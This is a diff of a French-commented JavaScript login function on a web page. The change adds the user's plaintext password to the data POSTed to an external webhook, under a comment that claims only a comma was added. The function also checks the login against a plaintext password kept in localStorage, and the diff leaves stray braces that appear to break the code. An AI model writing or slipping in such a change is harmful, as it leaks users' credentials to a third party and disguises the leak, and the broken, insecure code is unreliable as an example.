@@ -415,34 +415,40 @@
         }
 
         // Fonction de connexion
-    function login() {
-        const email = document.getElementById('login-email').value;
-        const password = document.getElementById('login-password').value;
-        const storedEmail = localStorage.getItem('userEmail');
-        const storedPassword = localStorage.getItem('userPassword');
+function login() {
+    const email = document.getElementById('login-email').value;
+    const password = document.getElementById('login-password').value;
+    const storedEmail = localStorage.getItem('userEmail');
+    const storedPassword = localStorage.getItem('userPassword');
 
-        if (email === storedEmail && password === storedPassword) {
-            alert('Connexion réussie!');
-            localStorage.setItem('isLoggedIn', 'true');
+    if (email === storedEmail && password === storedPassword) {
+        alert('Connexion réussie!');
+        localStorage.setItem('isLoggedIn', 'true');
 
-            // Envoi de données au webhook
-            const userData = {
-                action: 'login',
-                email: email
-            };
+        // Envoi de données au webhook
+        const userData = {
+            action: 'login',
+            email: email,  // Ajout de la virgule ici
+            password: password
+        };
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(userData),
-            }).then(response => {
-                if (response.ok) {
-                    console.log('Connexion enregistrée avec succès au webhook');
-                } else {
-                    console.error('Erreur lors de l\'enregistrement de la connexion au webhook');
-                }
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(userData),
+        }).then(response => {
+            if (response.ok) {
+                console.log('Connexion enregistrée avec succès au webhook');
+            } else {
+                console.error('Erreur lors de l\'enregistrement de la connexion au webhook');
+            }
+        });
+    } else {
+        alert('Email ou mot de passe incorrect');
+    }
+}
             });
 
             updateUI();
